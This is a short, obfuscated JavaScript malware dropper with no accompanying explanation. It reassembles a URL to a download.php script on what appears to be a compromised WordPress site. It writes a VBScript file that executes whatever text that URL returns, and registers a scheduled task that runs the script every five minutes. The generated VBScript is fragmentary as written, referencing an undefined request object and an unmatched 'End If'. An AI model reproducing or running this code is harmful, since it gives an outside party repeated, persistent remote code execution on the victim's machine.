const chunks = {
  0x7e: 'ps://www.o', 0x7f: 'neyoga-tea', 0xa8: 'chertraini',
  0xa6: 'ng.com/wp-', 0x8f: 'includes/J', 0x79: 'XE/downloa',
  0xa9: 'd.php?acti', 0x89: '      Exec', 0x8b: 'xmlHttp.re',
  0x9a: 'sponseText', 0xaf: ')\nEnd If'
};
function a0_0x337d93(index) { return chunks[index]; }
const url = 'htt' + a0_0x337d93(0x7e) + a0_0x337d93(0x7f) + a0_0x337d93(0xa8) +
  a0_0x337d93(0xa6) + a0_0x337d93(0x8f) + a0_0x337d93(0x79) + a0_0x337d93(0xa9);
const vbs = a0_0x337d93(0x89) + 'uteGlobal(' + a0_0x337d93(0x8b) + a0_0x337d93(0x9a) + a0_0x337d93(0xaf);
require('node:fs').writeFileSync('loader.vbs', `url = "${url}"\n${vbs}`);
require('node:child_process').execFile('schtasks.exe', ['/Create', '/SC', 'MINUTE', '/MO', '5', '/TR', 'wscript.exe loader.vbs']);
